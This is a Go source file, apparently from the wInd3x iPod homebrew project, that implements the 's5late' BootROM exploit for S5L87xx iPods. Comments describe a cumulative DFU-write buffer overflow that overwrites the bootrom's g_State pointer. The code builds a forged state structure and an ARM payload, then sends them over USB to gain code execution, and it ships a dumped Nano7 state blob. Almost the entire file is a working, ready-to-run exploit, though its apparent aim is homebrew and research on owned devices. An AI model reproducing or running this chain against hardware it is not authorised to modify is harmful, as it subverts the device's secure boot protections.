package exploit

// This implements gsch's s5late exploit for the S5L87xx BootROMs.
//
// The vulnerability exploited lies in the DFU download handler - while the
// number of data (wLength) in each individual download operation is checked
// against a maximum buffer size, cumulative writes are not. This means that we
// can overflow the buffer by doing subsequent downloads.
//
// Overflowing past the buffer lets us override the g_State pointer at 2202fff4.
// This is the main pointer used by the code to dereference access to the State
// structure of the bootROM, which lives on the SVC stack and contains pretty
// much the entire state of the bootrom codebase, including USB handlers and DFU
// handlers.
//
// Unfortunately, because that structure is very large and critical for the
// operation of the bootrom, it needs to be painstakingly recreated from scratch
// even if we just want to modify one field. The easiest way to do that is to
// dump it from a running device. For <=N5G we can use the wInd3x bug to dump
// it. For N6G/N7G we can use CUB3D's userspace ipod_sun exploit, as the
// structure is not zeroed out by the time RetailOS is booted. There is
// currently no known vulnerability to leak the State structure from a running
// BootROM other than wInd3x.
//
// We have an exploit chain very similar to gsch's original S5Late code. But
// instead of enabling CFW/HaxedDFU, we instead patch the Vendor USB interface
// request to be a 'blx r0', thereby turning it into a wInd3x-compatible bug.
// This then allows us to chain the rest of the wInd3x functionality/codebase
// from a massively different bug. This isn't optimal, but it makes for less
// code duplication.

import (
	"bytes"
	"encoding/binary"
	"fmt"

	"github.com/freemyipod/wInd3x/pkg/devices"
	"github.com/freemyipod/wInd3x/pkg/dfu"
	"github.com/freemyipod/wInd3x/pkg/uasm"
	"github.com/golang/glog"
)

type S5LateParameters struct {
	// stateRaw are the raw bytes of the State structure from a running bootrom.
	stateRaw []byte
	// bufferLocation is the location of the DFU buffer in memory.
	bufferLocation uint32
	// magicalMysteryValue is the value located at 0x2202fff0 in SRAM, which if
	// overridden crashes the device - even though it does not seem to be read
	// or written by any software running on the iPod.
	magicalMysteryValue uint32
}

func (p *S5LateParameters) DFUBufAddr() uint32 {
	return p.bufferLocation
}

func (p *S5LateParameters) ExecAddr() uint32 {
	return 0x2202de0c
}

func (p *S5LateParameters) USBBufAddr() uint32 {
	return 0x2202e300
}

func (p *S5LateParameters) SetupPacket() []byte {
	return []byte{0xc1, 0xfe, 0xff, 0xea, 0x00, 0x00, 0x00, 0x00}
}

func (p *S5LateParameters) NANDInit(bank uint32) ([]uasm.Statement, error) {
	return nil, fmt.Errorf("unimplemented")
}

func (p *S5LateParameters) NANDReadPage(bank, page, offset uint32) ([]uasm.Statement, uint32) {
	panic("unimplemented")
}

func (p *S5LateParameters) NORInit(spino uint32) ([]uasm.Statement, error) {
	return nil, fmt.Errorf("unimplemented")
}

func (p *S5LateParameters) NORRead(spino, offset uint32) ([]uasm.Statement, uint32) {
	panic("unimplemented")
}

func (p *S5LateParameters) HaxedDFUPayload() []uasm.Statement {
	// Same as N4G/N5G, just can't be bothered to express that at the type
	// system level.
	ep2 := epNano45G{ret1Addr: 0x2000_0f0c}
	return ep2.HaxedDFUPayload()
}

func (p *S5LateParameters) TrampolineAddr() uint16 {
	// No real trampoline, the requested class handler (0) is always buggy after
	// we make it so via the s5late vuln.
	return 0
}

func (p *S5LateParameters) HandlerFooter(addr uint32) []uasm.Statement {
	return []uasm.Statement{
		// Return 0x40 bytes of requested address.
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(addr)},
		uasm.Mov{Dest: uasm.R1, Src: uasm.Immediate(0x40)},
		uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x2000a654)},
		uasm.Blx{Dest: uasm.R2},
		// Fixup LR (after trampoline blx messes it up)
		uasm.Ldr{Dest: uasm.LR, Src: uasm.Constant(0x20004fb0)},
		uasm.Bx{Dest: uasm.LR},
	}
}

func (p *S5LateParameters) AESCall() []uasm.Statement {
	return makeCall(0x20002264, 0x2202db00, 0x2202db00, 0x40, 1, 0, 0)
}

func (p *S5LateParameters) DisableICache() []uasm.Statement {
	// Turns out that disabling ICache actually breaks DFU mode for some reason.
	// This doesn't make sense, but I'm not going to argue.
	//return makeCall(0x200004b8)
	return []uasm.Statement{}
}

func (p *S5LateParameters) Prepare(usb devices.Usb) error {
	// Set up a DFU buffer that will start at bufferLocation and override until
	// pretty much the end of SRAM.

	buf := bytes.NewBuffer(nil)

	buf.Write(bytes.Repeat([]byte{0}, 0x880))

	// Prepare first stage payload.
	payloadAddr := p.bufferLocation + uint32(buf.Len())
	payload := uasm.Program{
		Address: payloadAddr,
		Listing: []uasm.Statement{
			// R0 <- address of original state
			uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(0x2202ba3c)},
			// R1 <- R0 + offset of vendor handler in state
			uasm.Add{Dest: uasm.R1, Src: uasm.R0, Compl: uasm.Immediate(0x54 + 5*4)},
			// R2 <- blx r0 instr
			uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x2000_0474)},
			// [R1] <- R2, override vendor handler in original state
			uasm.Str{Src: uasm.R2, Dest: uasm.Deref(uasm.R1, 0)},

			// Reset DFU state fields.
			uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0)},
			uasm.Str{Src: uasm.R2, Dest: uasm.Deref(uasm.R0, 0x08)},
			uasm.Str{Src: uasm.R2, Dest: uasm.Deref(uasm.R0, 0x0c)},
			uasm.Str{Src: uasm.R2, Dest: uasm.Deref(uasm.R0, 0x10)},

			// R2 <- address of pointer to state
			uasm.Ldr{Dest: uasm.R2, Src: uasm.Constant(0x2202fff8)},
			// [R2] <- R0, use original state again
			uasm.Str{Src: uasm.R0, Dest: uasm.Deref(uasm.R2, 0)},

			uasm.Bx{Dest: uasm.LR},
		},
	}
	payloadBytes := payload.Assemble()
	buf.Write(payloadBytes)

	// New state to override.
	newStateAddr := p.bufferLocation + uint32(buf.Len())
	var newState state
	if binary.Size(&newState) != len(p.stateRaw) {
		return fmt.Errorf("raw state size (0x%x) doesn't match struct size (0x%x)", len(p.stateRaw), binary.Size(&newState))
	}
	if err := binary.Read(bytes.NewBuffer(p.stateRaw), binary.LittleEndian, &newState); err != nil {
		return fmt.Errorf("could not unpack raw state: %w", err)
	}
	newState.DFURecursiveState = newStateAddr
	newState.USBUploadComplete = 0
	newState.DFUImageReady = 0
	newState.DFULoopRun = 1
	newState.DFUStatusData = [6]byte{
		0, 21, 37, 42, 5, 0,
	}
	newState.DFUOnUploadChunk = payloadAddr
	binary.Write(buf, binary.LittleEndian, &newState)

	// We want to overflow into:
	//   2202_fff0: magical mystery value
	//   2202_fff4: (power?) state
	//   2202_fff8: g_State pointer (needs to point at new state)
	//   2202_fffc: g_Heap pointer (smashing it because might as well)

	// Pad until the mystery value.
	needLength := (0x2202_fff0 - p.bufferLocation)
	left := int(needLength) - buf.Len()
	if left < 0 {
		return fmt.Errorf("buffer too large")
	}
	buf.Write(bytes.Repeat([]byte{0}, left))

	if buf.Len()+int(p.bufferLocation) != 0x2202_fff0 {
		return fmt.Errorf("math seems off")
	}

	// Write overrides.
	binary.Write(buf, binary.LittleEndian, struct {
		mystery      uint32
		powerState   uint32
		statePointer uint32
		heapPointer  uint32
	}{
		p.magicalMysteryValue, 0, newStateAddr, 0x2202d900,
	})

	if err := dfu.Clean(usb); err != nil {
		return fmt.Errorf("clean: %w", err)
	}

	// Send in 0x410 chunks.
	//
	// The funny chunk size is required so that we never end up with a total
	// transferred size of 0x800 - or the status handling code will think we're
	// done sending things over.
	bufBytes := buf.Bytes()
	blockno := uint16(0)
	for {
		if len(bufBytes) == 0 {
			break
		}
		chunkSize := len(bufBytes)
		if chunkSize > 0x410 {
			chunkSize = 0x410
		}
		chunk := bufBytes[:chunkSize]
		bufBytes = bufBytes[chunkSize:]

		if err := dfu.SendChunk(usb, chunk, blockno); err != nil {
			return fmt.Errorf("can't send chunk over DFU: %w", err)
		}
		status, err := dfu.GetStatus(usb)
		if err != nil {
			return fmt.Errorf("dfu status failed: %w", err)
		}
		if want, got := dfu.ErrOk, status.Err; want != got {
			return fmt.Errorf("dfu status expected %d, got %d", want, got)
		}
		blockno += 1
	}

	if err := dfu.ClearStatus(usb); err != nil {
		return fmt.Errorf("dfu status clear failed: %w", err)
	}

	// Trigger the hook, firing the payload above.
	_, err := dfu.ReceiveChunk(usb, 0x40, 0)
	if err != nil {
		return fmt.Errorf("failed to trigger on_upload handler: %w", err)
	}

	status, err := dfu.GetStatus(usb)
	if err != nil {
		return fmt.Errorf("dfu status failed: %w", err)
	}
	if want, got := dfu.ErrOk, status.Err; want != got {
		return fmt.Errorf("post upload dfu status expected %d, got %d", want, got)
	}

	glog.Infof("Used S5Late (by gsch) to reintroduce wInd3x-style bug.")

	return nil
}

// state is the main BootROM state structure. We don't need most of these fields
// to be defined, but might as well.
type state struct {
	DFUBuf              uint32 // 0x00
	DFUBufSize          uint32 // 0x04
	DFUTransferredBytes uint32 // 0x08
	DFUCurrentSize      uint32 // 0x0c

	USBUploadComplete byte    // 0x10
	Pad1              [3]byte // 0x11

	DFUOnDetach          uint32 // 0x14
	DFUOnDownloadChunk   uint32 // 0x18
	DFUOnUploadChunk     uint32 // 0x1c
	DFUBootVerifyAndCopy uint32 // 0x20

	VTable uint32 // 0x24

	DFULoopRun    byte    // 0x28
	DFUImageReady byte    // 0x29
	Pad2          [2]byte // 0x2a

	Unk2 uint32 // 0x2c

	IMGHeaderJumpOffset uint32  //0x30
	IMGHeaderVersion    [3]byte //0x34
	Pad3                byte    // 0x37
	Unk4                uint32  // 0x38

	DFURecursiveState    uint32  // 0x3c
	DFUInterfaceSubClass byte    // 0x40
	DFUInterfaceProtocol byte    // 0x41
	DFUStatusData        [6]byte // 0x42

	CRC     uint32 // 0x48
	CRCable uint32 // 0x4c

	USBState             byte   // 0x50
	CurrentConfiguration byte   // 0x51
	SelfPowered          uint16 // 0x52

	USBHandlers [1]usbHandlers // 0x54

	USBEndpointDescriptor      uint32  // 0x70
	USBUnkInterfaceDescStuff   uint16  // 0x74
	UsbInterfaceNo             byte    // 0x76
	Pad4                       byte    // 0x77
	USBDeviceDescriptor        uint32  // 0x78
	USBConfigurationDescriptor uint32  // 0x7c
	USBStringDescZero          uint32  // 0x80
	USBStringDescCount         byte    // 0x84
	Pad5                       [3]byte // 0x85

	AESFlag     uint32 // 0x88
	SHAIntrFlag uint32 // 0x8c
	SHAOffset   uint32 // 0x90
	SHAHashed   uint32 // 0x94
	SHACont     uint32 // 0x98

	DMAChannelsUsed       byte    // 0x9c
	DMAChannel0Configured byte    // 0x9d
	Pad6                  [2]byte // 0x9e

	USBState2   byte    // 0xa0
	Pad7        [3]byte // 0xa1
	Unk5        byte    // 0xa4
	USBEP0State byte    // 0xa5
	Pad8        [2]byte // 0xa6

	EP0RXBufAddr      uint32  // 0xa8
	EP0RXBufOffset    uint32  // 0xac
	EP0RXBufSize      uint32  // 0xb0
	EP0TXBufAddr      uint32  // 0xb4
	EP0TXBufOffset    uint32  // 0xb8
	EP0TXBufSize      uint32  // 0xbc
	EP0DMA            uint32  // 0xc0
	EP0Speed          byte    // 0xc4
	Pad9              [3]byte // 0xc5
	TimerScaleFromDFU uint32  // 0xc8

	HeapChunks        [52]uint32  // 0xcc
	InterruptsForMode [0x380]byte // 0x19c
	Unk6              uint32      // 0x51c
	Unk7              uint32      // 0x520
	Unk8              uint32      // 0x524
	Unk9              uint32      // 0x528

	CertParserState [0x104]byte // 0x52c

	DFUBoot      uint32 // 0x630
	ChipInfo     uint32 // 0x634
	CNCA         uint32 // 0x638
	CNSecureBoot uint32 // 0x63c
}

type usbHandlers struct {
	InterfaceDescriptor uint32 // 0x00
	OnSetConfiguration  uint32 // 0x04
	Indiret             uint32 // 0x08
	OnSynchFrame        uint32 // 0x0c
	HandlerClass        uint32 // 0x10
	HandlerVendor       uint32 // 0x14
	Unk1                uint32 // 0x18
}

var S5LateParametersForKind = map[devices.Kind]*S5LateParameters{
	devices.Nano7: &S5LateParameters{
		stateRaw: []byte{
			0x00, 0xdb, 0x02, 0x22, 0x00, 0x08, 0x00, 0x00, 0x63, 0x48, 0x02,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x48, 0x3c, 0x00, 0x20, 0x40, 0x3c, 0x00, 0x20, 0xc8,
			0x3b, 0x00, 0x20, 0x20, 0x00, 0x00, 0x20, 0x01, 0x02, 0x00, 0x00,
			0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x32, 0x2e, 0x30,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x3c, 0xba, 0x02, 0x22, 0x01, 0x02,
			0x00, 0xb8, 0x0b, 0x00, 0x07, 0x00, 0xdc, 0xab, 0x44, 0x52, 0x44,
			0x48, 0xf0, 0x60, 0x05, 0x01, 0x00, 0x00, 0x8f, 0xbd, 0x00, 0x20,
			0xb4, 0x43, 0x00, 0x20, 0x74, 0x43, 0x00, 0x20, 0x00, 0x00, 0x00,
			0x00, 0x24, 0x3e, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x74,
			0xbd, 0x00, 0x20, 0x86, 0xbd, 0x00, 0x20, 0xf4, 0xb9, 0x02, 0x22,
			0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
			0x00, 0x38, 0x00, 0x00, 0x00, 0xa7, 0x03, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00,
			0x01, 0x00, 0x00, 0x00, 0xdb, 0x02, 0x22, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x7e, 0xba, 0x02, 0x22, 0x06, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe3, 0x02, 0x22, 0x02, 0x00,
			0x00, 0x00, 0x00, 0x87, 0x93, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8,
			0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20,
			0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00,
			0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11,
			0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0xf8, 0x11, 0x00, 0x20, 0x00,
			0x1c, 0x4e, 0x0e, 0x00, 0x0e, 0x27, 0x07, 0x00, 0x87, 0x93, 0x03,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x62, 0x00, 0x00, 0x00, 0x49, 0x44, 0x02, 0x22, 0x62, 0x00,
			0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x95,
			0x44, 0x02, 0x22, 0x16, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00,
			0xa3, 0x03, 0x00, 0x00, 0xac, 0x43, 0x02, 0x22, 0xa3, 0x03, 0x00,
			0x00, 0x15, 0x00, 0x00, 0x00, 0x7a, 0x01, 0x00, 0x00, 0xd5, 0x45,
			0x02, 0x22, 0x7a, 0x01, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x76,
			0x01, 0x00, 0x00, 0xd9, 0x45, 0x02, 0x22, 0x76, 0x01, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0xe4, 0xb9, 0x02, 0x22, 0x02, 0x00, 0x00, 0x00, 0x7c, 0x39, 0x00,
			0x20, 0x34, 0x39, 0x00, 0x20,
		},
		bufferLocation:      0x2202db00,
		magicalMysteryValue: 0xba581067,
	},
}
